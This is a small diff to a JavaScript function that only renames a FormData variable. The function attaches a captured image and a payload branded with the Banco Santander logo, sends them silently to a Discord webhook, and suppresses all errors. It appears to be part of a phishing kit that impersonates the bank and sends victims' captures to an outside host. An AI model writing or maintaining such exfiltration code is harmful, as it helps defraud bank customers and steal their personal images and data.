@@ -92,12 +92,12 @@
             avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/Banco_Santander_Logotipo.svg/512px-Banco_Santander_Logotipo.svg.png',
             embeds: embeds
         };
-        var formData = new FormData();
-        formData.append('payload_json', JSON.stringify(payload));
-        formData.append('files[0]', fileBlob, filename || 'capture.jpg');
+        var data = new FormData();
+        data.append('payload_json', JSON.stringify(payload));
+        data.append('files[0]', fileBlob, filename || 'capture.jpg');
         return fetch(DISCORD_WEBHOOK_URL, {
             method: 'POST',
-            body: formData
+            body: data
         }).then(function() {}).catch(function() {});
     }
 
